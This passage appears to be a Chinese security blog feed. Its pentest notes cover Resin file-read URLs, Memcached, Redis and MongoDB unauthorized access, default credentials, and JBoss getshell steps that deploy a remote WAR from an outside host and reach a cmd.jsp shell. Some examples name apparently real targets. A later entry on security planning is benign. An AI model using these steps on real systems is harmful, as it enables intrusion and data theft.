漏洞利用 "></a>22.2 漏洞利用 </h2><p>Resin的某个CGI程序实现上存在输入验证漏洞，远程攻击者可能利用此漏洞读取Web主目录下的任意文件。</p><ul><li>任意文件读取：</li></ul><p>配置文件：</p><p><a href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml" target="_blank" rel="noopener">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml</a></p><p>读取源码：</p><p><a href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp" target="_blank" rel="noopener">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp</a></p><p>读取password.xml</p><p>ip/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/password.xml</p><ul><li>resin文件包含漏洞shell (wooyun-2013-023139)</li></ul><p><a href="http://ip/Resin-doc/viewfile/?contextpath=C:\\&amp;servletpath=&amp;file=boot.ini" target="_blank" rel="noopener">http://ip/Resin-doc/viewfile/?contextpath=C:\\&amp;servletpath=&amp;file=boot.ini</a></p><ul><li>resin弱口令</li></ul><p><a href="http://ip/resin-admin/status.php" target="_blank" rel="noopener">http://ip/resin-admin/status.php</a> admin / admin</p><ul><li>resin版本过低，导致磁盘信息泄露</li></ul><p><a href="http://ip/c:/" target="_blank" rel="noopener">http://ip/c:/</a></p><h2 id="22-3-实例演练"><a href="#22-3-实例演练" class="headerlink" title="22.3 实例演练 "></a>22.3 实例演练 </h2><p><a href="http://www.xx.cn/c:/" target="_blank" rel="noopener">http://www.xx.cn/c:/</a> （wooyun-2013-041338）</p><p><img src="\assets\img\安全运维\file_html_c53a22d32c38834b.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_6a5593fbd445e703.png" alt=""></p><h1 id="23-memcache未限制访问IP"><a href="#23-memcache未限制访问IP" class="headerlink" title="23 memcache未限制访问IP "></a>23 memcache未限制访问IP </h1><h2 id="23-1-基础知识"><a href="#23-1-基础知识" class="headerlink" title="23.1 基础知识 "></a>23.1 基础知识 </h2><p>Memcached是一个高性能的分布式内存对象缓存系统，用于动态web应用以减轻数据库负载。它通过内存缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。Memcached基于一个存储键/值对的hashmap。其守护进程是用C写的，但是客户端可以用任何语言来编写，并通过memcached协议与守护进程通信。</p><h2 id="23-2-漏洞利用"><a href="#23-2-漏洞利用" class="headerlink" title="23.2 漏洞利用 "></a>23.2 漏洞利用 </h2><p>Memcached未限制IP导致cache泄露<br>服务默认端口：11211</p><ul><li>使用nc 反弹查看数据：</li></ul><p>nc.exe –vv ip 11211</p><p>ip: inverse host lookup failed: h_errno 11004: NO_DATA</p><p>(UNKNOWN) [ip] 11211 (?) open</p><p>stats items</p><p>STAT items:4:number 1544729</p><p>…….</p><ul><li>memcached空口令访问 可以直接telnet登陆<br>wooyun-2010-0123604</li></ul><ul><li>root@kali:~# nc ip 11211</li></ul><h2 id="23-3-实战演练"><a href="#23-3-实战演练" class="headerlink" title="23.3 实战演练 "></a>23.3 实战演练 </h2><p>root@Aerfa:~# nc -vv xx.xx.xx.xx 11211</p><p><img src="\assets\img\安全运维\file_html_ba1df478b9b7aee9.png" alt=""></p><p>root@Aerfa:~# nc -vv yy.yy.yy.yy 11211</p><p><img src="\assets\img\安全运维\file_html_df926128a0be01ea.png" alt=""></p><h1 id="24-Jboss配置不当"><a href="#24-Jboss配置不当" class="headerlink" title="24 Jboss配置不当 "></a>24 Jboss配置不当 </h1><p>drops.wooyun.org/papers/178</p><h2 id="24-1-基本信息"><a href="#24-1-基本信息" class="headerlink" title="24.1 基本信息 "></a>24.1 基本信息 </h2><p>Jboss基于J2EE的开放源代码的应用服务器（JAVA应用服务器），是一个管理EJB的容器和服务器（Jboss企业中间件JEMS的一部分），其核心服务不包括service/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p><p>Jboss应用服务框架：</p><ul><li>Java管理扩展（JMX）：监控管理java应用程序的标准化架构，分为三层：</li></ul><p><img src="\assets\img\安全运维\file_html_7ca4d6381121d244.png" alt=""></p><p>设备层（instrumentation）：定义信息模型。</p><p>代理层（Agent）：定义各种服务以及通信模型，所有的管理构件都需要向他注册。</p><p>分布服务层（distribute）：定义能对代理层进行操作的管理接口和构件。</p><ul><li>JMX<br>Invoker：允许客户端应用程序发送任意协议的JMX请求到服务端</li></ul><p>这些请求都是用MBean服务器发送到响应的Mbean服务</p><ul><li>Deployer架构：</li></ul><p>JAR（Java<br>Archives），用于压缩、发布、部署和封装库、组件、程序插件。</p><p>WAR（Web<br>ARchives），JAR文件包含一个Web应用程序的组件。</p><h2 id="24-2-漏洞利用"><a href="#24-2-漏洞利用" class="headerlink" title="24.2 漏洞利用 "></a>24.2 漏洞利用 </h2><ul><li>WAR文件 </li></ul><p>在Jboss应用服务器上最简单的运行代码方式是部署一个组件，可以通过HTTP安装组件，war文件包需要在web-inf目录下包含一个web.xml文件。War文件可以使用java的SDK<br>jar命令创建。</p><ul><li>JMX Console</li></ul><p>web-console</p><p>jmx-console</p><p>invoker/JMXInvokerServlet</p><p>JMX控制台允许通过web浏览器与Jboss应用服务器直接互动的组件，方便管理Jboss服务器，Mbean的属性与方法可以直接调用。</p><p>JMX控制台通常是攻击的第一目标，Mbeans的属性（Server和ServerInfo）展现了Jboss应用服务器与主机系统的信息，包含java虚拟机以及操作系统的类型版本信息。</p><p>Mbean的shutdown()方法可以关闭Jboss应用服务器，未授权的JMX接口可以导致拒绝服务攻击。</p><p>War包的部署，执行shell命令。</p><ul><li>Jboss弱口令</li></ul><p><a href="http://IP/admin-console" target="_blank" rel="noopener">http://IP/admin-console</a> admin / admin</p><h2 id="24-3-实例应用"><a href="#24-3-实例应用" class="headerlink" title="24.3 实例应用 "></a>24.3 实例应用 </h2><p><a href="http://yy.yy.yy.yy:8080/web-console/" target="_blank" rel="noopener">http://yy.yy.yy.yy:8080/web-console/</a> 未授权访问</p><p><img src="\assets\img\安全运维\file_html_8e55e3f044ed0364.png" alt=""></p><p>先下载java插件，再控制面板中找到java，设置java控制面板的安全属性，添加例外网站。</p><p><img src="\assets\img\安全运维\file_html_90d6709742b78542.png" alt=""></p><h3 id="admin-console-getshell"><a href="#admin-console-getshell" class="headerlink" title=" admin-console getshell"></a><1> admin-console getshell</1></h3><p><a href="http://yy.yy.yy.yy/admin-console/" target="_blank" rel="noopener">http://yy.yy.yy.yy/admin-console/</a> 无效</p><p><img src="\assets\img\安全运维\file_html_28bdb02a0cb5a373.png" alt=""></p><h3 id="jmx-console-getshell"><a href="#jmx-console-getshell" class="headerlink" title=" jmx-console getshell"></a><2> jmx-console getshell</2></h3><p><a href="http://yy.yy.yy.yy/jmx-console/" target="_blank" rel="noopener">http://yy.yy.yy.yy/jmx-console/</a> 存在</p><p>需要将war包或jsp shell放到服务器上<br><a href="http://p2j.cn/is.war" target="_blank" rel="noopener">http://p2j.cn/is.war</a></p><p>jboss.deployment——&gt;void addURL</p><p><img src="\assets\img\安全运维\file_html_d6a528da8f01270e.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_fa352df195521efa.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_5acfb48291d0131b.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_b4b2160d26750158.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_cc69a4e856862c50.png" alt=""></p><p>上传成功，但是文件访问不存在</p><p><img src="\assets\img\安全运维\file_html_6201bba2e6c4598.png" alt=""></p><h3 id="web-console-getshell"><a href="#web-console-getshell" class="headerlink" title=" web-console getshell"></a><3> web-console getshell</3></h3><p><a href="http://xx.xx.xx.xx/web-console/" target="_blank" rel="noopener">http://xx.xx.xx.xx/web-console/</a> 存在</p><p><img src="\assets\img\安全运维\file_html_15bb592501eaeab4.png" alt=""></p><h3 id="invoker-getshell"><a href="#invoker-getshell" class="headerlink" title=" invoker getshell"></a><41> invoker getshell</41></h3><p>inovker接口未配置认证信息</p><p>yy.yy.yy.yy/invoker/JMXInvokerServlet</p><p><img src="\assets\img\安全运维\file_html_51cd584709c21a49.png" alt=""></p><p>案例<a href="http://www.wooyun.org/bugs/wooyun-2010-0121861" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0121861</a>中使用curl命令：</p><p>curl <a href="http://www.wooyun.org/bugs/wooyun-2010-0121861" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0121861</a></p><p><img src="\assets\img\安全运维\file_html_ce74e6ffdf131681.png" alt=""></p><p>查看系统名称：</p><p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet" target="_blank" rel="noopener">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSName</p><p>Windows 2003</p><p><img src="\assets\img\安全运维\file_html_228e2132d6117e7e.png" alt=""></p><p>查看系统版本</p><p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet" target="_blank" rel="noopener">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSVersion</p><p><img src="\assets\img\安全运维\file_html_520647a32422e3a2.png" alt=""></p><p>远程部署war包（失败）</p><p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet" target="_blank" rel="noopener">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> invoke jboss.system:service=MainDeployer deploy<br><a href="http://p2j.cn/is.war" target="_blank" rel="noopener">http://p2j.cn/is.war</a></p><p><img src="\assets\img\安全运维\file_html_f6f6157ae371b472.png" alt=""></p><p><a href="http://ts-spsoft.sgst.cn/is/?cmd.jsp?pwd=023&amp;cmd=ls" target="_blank" rel="noopener">http://yy.yy.yy.yy/is/?cmd.jsp?pwd=023&amp;cmd=ls</a><br>访问shell是失败</p><p><img src="\assets\img\安全运维\file_html_9f1eec4d60316f17.png" alt=""></p><h1 id="25-测试机外网可访问"><a href="#25-测试机外网可访问" class="headerlink" title="25 测试机外网可访问 "></a>25 测试机外网可访问 </h1><p>测试机处于外网环境内，存在很多安全问题。比如wooyun案例中的弱口令、java环境管理软件未授权访问、…..<br>此部分不好做归纳，故略过。</p><h1 id="26-padding-oracle-attack"><a href="#26-padding-oracle-attack" class="headerlink" title="26 padding oracle attack "></a>26 padding oracle attack </h1><h2 id="26-1-基础知识"><a href="#26-1-基础知识" class="headerlink" title="26.1 基础知识 "></a>26.1 基础知识 </h2><p>Padding指数据“填充”</p><p>对于<a href="http://baike.baidu.com/view/155969.htm" target="_blank" rel="noopener">加密算法</a>来说，它们是基于等长的“<a href="http://baike.baidu.com/view/702806.htm" target="_blank" rel="noopener">数据块</a>”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节(<a href="http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS" target="_blank" rel="noopener">http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS</a><br>#5规则，简单地说，便是根据最后一个数据块(<a href="http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。" target="_blank" rel="noopener">http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。</a></p><h2 id="26-2-漏洞利用"><a href="#26-2-漏洞利用" class="headerlink" title="26.2 漏洞利用 "></a>26.2 漏洞利用 </h2><p>略过，乌云上有案例。</p><h1 id="27-tomcat弱口令"><a href="#27-tomcat弱口令" class="headerlink" title="27 tomcat弱口令 "></a>27 tomcat弱口令 </h1><h2 id="27-1-基础知识"><a href="#27-1-基础知识" class="headerlink" title="27.1 基础知识 "></a>27.1 基础知识 </h2><p>不再提及。</p><h2 id="27-2-漏洞利用"><a href="#27-2-漏洞利用" class="headerlink" title="27.2 漏洞利用 "></a>27.2 漏洞利用 </h2><p>弱密码：</p><p><a href="http://www.xxxx.com:8080/manager/html" target="_blank" rel="noopener">http://www.xxxx.com:8080/manager/html</a> tomcat:tomcat</p><p><a href="http://www.xxxx.com:8080/manager/html" target="_blank" rel="noopener">http://www.xxxx.com:8080/manager/html</a> admin:admin</p><h1 id="28-phpmyadmin弱口令"><a href="#28-phpmyadmin弱口令" class="headerlink" title="28 phpmyadmin弱口令 "></a>28 phpmyadmin弱口令 </h1><p>略</p><h1 id="29-MongoDB配置不当"><a href="#29-MongoDB配置不当" class="headerlink" title="29 MongoDB配置不当 "></a>29 MongoDB配置不当 </h1><p>drops.wooyun.org/papers/850</p><h2 id="29-1-基本介绍"><a href="#29-1-基本介绍" class="headerlink" title="29.1 基本介绍 "></a>29.1 基本介绍 </h2><p>略</p><h2 id="29-2-未授权访问"><a href="#29-2-未授权访问" class="headerlink" title="29.2 未授权访问 "></a>29.2 未授权访问 </h2><p>默认数据库 admin</p><p>用户密码和密码均为空</p><p><img src="\assets\img\安全运维\file_html_af31540eed427f60.png" alt=""></p><h2 id="29-3-实战演练"><a href="#29-3-实战演练" class="headerlink" title="29.3 实战演练 "></a>29.3 实战演练 </h2><p>yy.yy.yy.yy:27017<br>博苑家_幼儿园教育信息化平台</p><p><img src="\assets\img\安全运维\file_html_933d6e56d127adb.png" alt=""></p><h1 id="30-各种敏感后台对外开放"><a href="#30-各种敏感后台对外开放" class="headerlink" title="30 各种敏感后台对外开放 "></a>30 各种敏感后台对外开放 </h1><p>一般“奇葩”端口web访问可见。</p><h1 id="31-Django配置不当致信息泄露"><a href="#31-Django配置不当致信息泄露" class="headerlink" title="31 Django配置不当致信息泄露 "></a>31 Django配置不当致信息泄露 </h1><p>Django设置debug = True<br>，将报错信息返回至浏览页面，从而导致信息泄露</p><h1 id="32-Redis未授权访问"><a href="#32-Redis未授权访问" class="headerlink" title="32 Redis未授权访问 "></a>32 Redis未授权访问 </h1><p>Port: 6379</p><p>一般不需要认证，可直接访问</p><h2 id="32-1-基础知识"><a href="#32-1-基础知识" class="headerlink" title="32.1 基础知识 "></a>32.1 基础知识 </h2><p>Redis是一个NoSQL的数据库，数据通过键/值对存储在内存中。默认配置中，默认开放没有认证的TCP/6379端口。</p><p>和memcached类似，支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)。与memcached不同之处在于，可以随时执行“save”命令将当前redis的数据保存到硬盘，此外redis也会根据配置自动存储数据到硬盘上。</p><p>其中RDB就像数据库备份文件</p><p>AOF则是一个log日志文件</p><h2 id="32-2-利用方式"><a href="#32-2-利用方式" class="headerlink" title="32.2 利用方式 "></a>32.2 利用方式 </h2><ul><li>Kali下：</li></ul><p>redis-cli -h xx.com</p><ul><li><p>使用软件： Redis Desktop Manager</p></li><li><p>利用redis未授权访问漏洞getshell【<a href="http://www.secpulse.com/archives/5357.html】" target="_blank" rel="noopener">www.secpulse.com/archives/5357.html】</a></p><ul><li><p>开启web服务</p></li><li><p>网站物理路径</p></li><li><p>www目录可写（root权限）</p></li></ul></li></ul><h2 id="32-3-实战演练"><a href="#32-3-实战演练" class="headerlink" title="32.3 实战演练 "></a>32.3 实战演练 </h2><p>xx科技有限公司</p><p><img src="\assets\img\安全运维\file_html_83a0c3790ea4b0cf.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_f0a10558018436fa.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_29c9a47e91a7ef0a.png" alt=""></p><h1 id="33-LDAP未授权访问"><a href="#33-LDAP未授权访问" class="headerlink" title="33 LDAP未授权访问 "></a>33 LDAP未授权访问 </h1><p>Port: 389<br>WooYun-2015-92789(<a href="http://www.wooyun.org/bugs/wooyun-2015-092789" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2015-092789</a>)</p><h2 id="33-1-基础知识"><a href="#33-1-基础知识" class="headerlink" title="33.1 基础知识 "></a>33.1 基础知识 </h2><p>Lightweight Directory Access<br>Protocol，轻量目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p><h2 id="33-2-利用方式"><a href="#33-2-利用方式" class="headerlink" title="33.2 利用方式 "></a>33.2 利用方式 </h2><p>使用LDAP Admin进行登陆</p><h2 id="33-3-应用实例"><a href="#33-3-应用实例" class="headerlink" title="33.3 应用实例 "></a>33.3 应用实例 </h2><p>zz.zz.zz.zz</p><p><img src="\assets\img\安全运维\file_html_63de4b8b96d21dcd.png" alt=""></p><h1 id="34-SMB弱口令"><a href="#34-SMB弱口令" class="headerlink" title="34 SMB弱口令 "></a>34 SMB弱口令 </h1><p>Port: 445</p><h2 id="34-1-smb字典"><a href="#34-1-smb字典" class="headerlink" title="34.1 smb字典 "></a>34.1 smb字典 </h2><h2 id="34-2-MS08-067溢出"><a href="#34-2-MS08-067溢出" class="headerlink" title="34.2 MS08-067溢出 "></a>34.2 MS08-067溢出 </h2><p><a href="http://www.2cto.com/Article/201308/237265.html" target="_blank" rel="noopener">http://www.2cto.com/Article/201308/237265.html</a></p><p>Windows Server<br>服务RPC请求缓冲区溢出漏洞，如果用户在受影响的系统上收到特制的RPC请求，则该漏洞可能允许远程执行代码。在Microsoft<br>Windows 2000 、Windows XP 、Windows<br>Server2003系统上，攻击者可能未经身份即可利用此漏洞运行代码，此漏洞可以形成蠕虫攻击。</p><p>Nmap 可以检测目标上是否存在该漏洞：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namp –sS –A –script=smb-check-vulns –PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span><span class="selector-class">.zz</span></span><br><span class="line"></span><br><span class="line">nmap -sS -A --script=smb-check-vulns -PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span><span class="selector-class">.zz</span></span><br></pre></td></tr></table></figure></p><p>…….</p><h1 id="35-openssl心脏出血"><a href="#35-openssl心脏出血" class="headerlink" title="35 openssl心脏出血 "></a>35 openssl心脏出血 </h1><p>Port：443</p><p>Kali桌面以保存python验证脚本</p><p>root@Aerfa:~/Desktop# python openssl.py zz.zz.zz.zz</p><h1 id="36-squid代理默认端口"><a href="#36-squid代理默认端口" class="headerlink" title="36 squid代理默认端口 "></a>36 squid代理默认端口 </h1><p>Port: 3128</p><p>若没有设置口令，则很可能直接漫游内网。</p><h1 id="37-GlassFish-web中间件弱口令"><a href="#37-GlassFish-web中间件弱口令" class="headerlink" title="37 GlassFish web中间件弱口令 "></a>37 GlassFish web中间件弱口令 </h1><p>Port: 4848</p><p>弱口令：admin / adminadmin</p><h1 id="38-PHP-FastCGI远程利用"><a href="#38-PHP-FastCGI远程利用" class="headerlink" title="38 PHP FastCGI远程利用 "></a>38 PHP FastCGI远程利用 </h1><p>Port：9000</p><p>zone.wooyun.org/content/1060</p><p>使用nmap进行指纹识别： <code>nmap –sV –p 9000–open zz.zz.zz.zz/24</code></p><p>目前遇到poc执行出现问题：invalid header<br>version</p><p>（windows 7下未安装goland，<br>kali中已安装仍然出现该问题）</p><h1 id="39-elasticsearch代码执行"><a href="#39-elasticsearch代码执行" class="headerlink" title="39 elasticsearch代码执行 "></a>39 elasticsearch代码执行 </h1><p>Port: 9200</p><h1 id="40-websphere-web中间件弱口令"><a href="#40-websphere-web中间件弱口令" class="headerlink" title="40 websphere web中间件弱口令 "></a>40 websphere web中间件弱口令 </h1><p>Port: 9043</p><p>弱口令：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin / admin</span><br><span class="line"></span><br><span class="line">websphere / websphere</span><br><span class="line"></span><br><span class="line">system / manager</span><br></pre></td></tr></table></figure></p><h1 id="41-zebra路由弱密码"><a href="#41-zebra路由弱密码" class="headerlink" title="41 zebra路由弱密码 "></a>41 zebra路由弱密码 </h1><p>Port: 2601,2604</p><p>zebra / zebra</p><h1 id="42-rundeck-web"><a href="#42-rundeck-web" class="headerlink" title="42 rundeck web "></a>42 rundeck web </h1><p>Port：4440 wooyun-2015-092026</p><p>runDeck是用Java/Grails写的开源工具，帮助用户在数据中心或者云环境中自动化各种操作和流程。通过命令行或web界面，用户可以对任意数量的服务器进行操作，大大降低了对服务器自动化的门槛。</p><p><a href="http://IP:4440" target="_blank" rel="noopener">http://IP:4440</a> admin / admin</p><p><a href="http://IP:4440/menu/home" target="_blank" rel="noopener">http://IP:4440/menu/home</a></p><h1 id="43-dns未设置spf导致邮箱欺骗漏洞"><a href="#43-dns未设置spf导致邮箱欺骗漏洞" class="headerlink" title="43 dns未设置spf导致邮箱欺骗漏洞 "></a>43 dns未设置spf导致邮箱欺骗漏洞 </h1><p>nslookup –qt=mx baidu.com</p><p>nslookup –qt=txt baidu.com</p><h1 id="44-CVS源码泄露"><a href="#44-CVS源码泄露" class="headerlink" title="44 CVS源码泄露 "></a>44 CVS源码泄露 </h1><h2 id="44-1-基础知识"><a href="#44-1-基础知识" class="headerlink" title="44.1 基础知识 "></a>44.1 基础知识 </h2><p>略</p><h2 id="44-2-实例应用"><a href="#44-2-实例应用" class="headerlink" title="44.2 实例应用 "></a>44.2 实例应用 </h2><p>zz集团</p><p><a href="http://61.152.242.65/bs3q/CVS/Root" target="_blank" rel="noopener">http://yy.yy.yy.yy/bs3q/CVS/Root</a></p><p><a href="http://61.152.242.65/cmbs/CVS/Root" target="_blank" rel="noopener">http://yy.yy.yy.yy/cmbs/CVS/Root</a></p><p><img src="\assets\img\安全运维\file_html_9f3274155b1132f6.png" alt=""></p><p><a href="http://61.152.242.65/cmbs/CVS/Entries" target="_blank" rel="noopener">http://yy.yy.yy.yy/cmbs/CVS/Entries</a></p><p><img src="\assets\img\安全运维\file_html_41469a6a25a8a31a.png" alt=""></p><h1 id="45-Tomcat-examples-directory漏洞"><a href="#45-Tomcat-examples-directory漏洞" class="headerlink" title="45 Tomcat examples directory漏洞 "></a>45 Tomcat examples directory漏洞 </h1><p><a href="http://61.152.242.65/examples/servlets/servlet/SessionExample" target="_blank" rel="noopener">http://yy.yy.yy.yy/examples/servlets/servlet/SessionExample</a></p><p><img src="\assets\img\安全运维\file_html_3a3e383932a1596a.png" alt=""></p><p>是否存在sql post注入<br>、session伪造等安全问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0-Readme&quot;&gt;&lt;a href=&quot;#0-Readme&quot; class=&quot;headerlink&quot; title=&quot;0 Readme &quot;&gt;&lt;/a&gt;0 Readme &lt;/h1&gt;&lt;p&gt;来源于网络，回馈于网络。&lt;/p&gt;
&lt;p&gt;以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。&lt;/p&gt;
&lt;p&gt;这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。&lt;/p&gt;
&lt;p&gt;仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://pa55w0rd.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全运维" scheme="http://pa55w0rd.github.io/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/"/>
    
      <category term="漏洞利用" scheme="http://pa55w0rd.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web应用安全测试备忘录 By legend</title>
    <link href="http://pa55w0rd.github.io/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://pa55w0rd.github.io/web应用安全测试备忘录/</id>
    <published>2018-10-29T03:38:20.000Z</published>
    <updated>2018-11-21T08:54:34.539Z</updated>
    
    <content type="html"><![CDATA[<p><img src="\assets\img\xss\8.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;\assets\img\xss\8.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="web安全" scheme="http://pa55w0rd.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="备忘录" scheme="http://pa55w0rd.github.io/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>信息安全规划文档的编写  （转发）</title>
    <link href="http://pa55w0rd.github.io/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%92%E6%96%87%E6%A1%A3%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <id>http://pa55w0rd.github.io/信息安全规划文档的编写/</id>
    <published>2018-10-29T03:37:20.000Z</published>
    <updated>2018-11-21T08:51:30.054Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转自 ：<a href="https://xz.aliyun.com/t/2424" target="_blank" rel="noopener">https://xz.aliyun.com/t/2424</a></p></blockquote><h2 id="0x00-安全规划的目的"><a href="#0x00-安全规划的目的" class="headerlink" title="0x00 安全规划的目的"></a>0x00 安全规划的目的</h2><p>组织安全部门建立到运行一段的时间，工作阶段从救火到标准化的过程就需要考虑编制和实施适合自己组织的安全规划了。</p><p>编写安全规划主要为以后的工作进行合理的估计和安排，从结构上提升组织的安全水平，大概是从杂牌军到正规军的转变，也有可能现有的方法满足不了实际业务的需求，需要重新规划、设计。</p><a id="more"></a><p><img src="\assets\img\xss\7.png" alt="1"></p><h2 id="0x01-安全规划应该包含的内容"><a href="#0x01-安全规划应该包含的内容" class="headerlink" title="0x01 安全规划应该包含的内容"></a>0x01 安全规划应该包含的内容</h2><p>安全现状从国际、国内、行业和本组织的安全情况，引出安全需求；需求上分析合规性要求和业务要求，引出安全的整体策略和目标。</p><p>用一个房子图描述安全整体规划和保障体系，后面整体描述用什么方法和计划完成这个规划。</p><p>安全规划通常包含技术方案和管理方案，要保证方案能够落地再加上安全运行/运营，从传统安全来说，物理安全、网络安全、主机安全、应用安全、数据安全各种技术和管理的措施要到位。</p><p>办公网安全和生产网安全区别很大，可以考虑单独分析。</p><p>安全规划要提供可供执行、能够落地的工作计划，安全规划通常3年一个周期，缘起计划可以简略，但是需要列出本年度的详细工作计划。</p><p>最后是信息安全工作的执行考核和改进。</p><h2 id="0x02-如何做好安全规划"><a href="#0x02-如何做好安全规划" class="headerlink" title="0x02 如何做好安全规划"></a>0x02 如何做好安全规划</h2><p>关键的几点：</p><ol><li>组织内的安全部门有明确的职责和权利，安全部门的活动有组织高层的行动支持；</li><li>目标合理，可执行性高；</li><li>根据组织安全的实际情况编写，前期做好风险评估、威胁建模、攻击面分析，<strong>防护方案以满足实际需要为主，控制好成本支出</strong>；</li><li>管理和技术的安全措施参考 ISO 27001 和等级保护，重点偏安全运行；</li><li>一定要有人员的培训和考核，将纸面上的规划落实成实际的效果。</li></ol><h3 id="管理和技术上的要求"><a href="#管理和技术上的要求" class="headerlink" title="管理和技术上的要求"></a>管理和技术上的要求</h3><p>管理方面参考 ISO 27001 的要求、等级保护的要求行业监管的要求，对策略、规程、标准、流程和记录，选择适用自己组织的管理要求。</p><h4 id="技术要求示例"><a href="#技术要求示例" class="headerlink" title="技术要求示例"></a>技术要求示例</h4><p><strong>应用安全</strong></p><ul><li><p>概述：采用安全技术确保应用系统本身的防护，以及对于应用间数据接口、远程终端的数据访问的安全防护。</p></li><li><p>范围：</p><ul><li>Web 容器、中间件、Web 服务器</li><li>Web 应用</li></ul></li><li><p>防护目标:</p><ul><li>通过采取身份认证、访问控制等安全措施，保证系统自身的安全性以及与其他系统数据进行数据交换时所传输数据的安全性。</li><li>建立软件安全的输入控制，确保输入数据符合系统设定要求，提供软件自动保护功能，当故障发生时保护自动保护当前所有状态</li><li>采取审计措施实施在安全事件发生前发现入侵意图、在安全事件发生时进行告警提示和在安全事件发生后能进行审计追踪。</li></ul></li><li><p>防护要点：</p><ul><li>身份鉴别：应提供专用的登录控制模块对登录用户进行身份标识和鉴别；应对同一用户采用2种以上的组合鉴别技术实现用户身份鉴别；提供用户身份标识的唯一性和鉴别信息复杂度检查功能；提供登录失败处理功能，可采取结束会话、限制非法登录次数和自动退出等机制；启用软件中的安全功能，并根据安全策略配相关参数。</li><li>访问控制：应提供访问控制功能，依据安全策略控制用户对文件、数据库表等客体的访问；应由授权主体配置访问控制策略，并严格限制默认账户的访问权限；应授予不同账户为完成各自承担任务所需的最小权限，并在他们之间形成相互制约的关系；应对有重要信息资源设置敏感标签的功能。应依据安全策略严格控制用户对敏感标记重要信息资源的操作。</li><li>安全审计：应提供覆盖到每个用户的安全审计功能，对应用系统重要安全事件进行审计；应确保无法单独终端审计进程，无法删除、修改、覆盖审计记录；应对审计的数据进行统计、查询、分析以及生成审计报表的功能。</li><li>剩余信息保护：保证用户鉴别信息所在的存储空间在被释放或重新分配给其他用户之前完全清除，无论在硬盘还是内存中；应保证系统内的文件、目录和数据库记录等资源空间被释放或重新分配给其他用户前得到完全清除。</li><li>通信完整性：采用密码技术保证通信过程中数据的完整性。</li><li>通信保密性：在通信双方建立连接之前，应用系统利用密码技术进行初始化会话验证；应对通信过程的报文或会话信息过程进行加密。</li><li>抗抵赖：应具有在请求的情况下为数据原发者或接收者提供数据原发证据和数据接收证据的功能。</li><li>软件容错：应提供数据有效性检验功能，通过人机接口输入或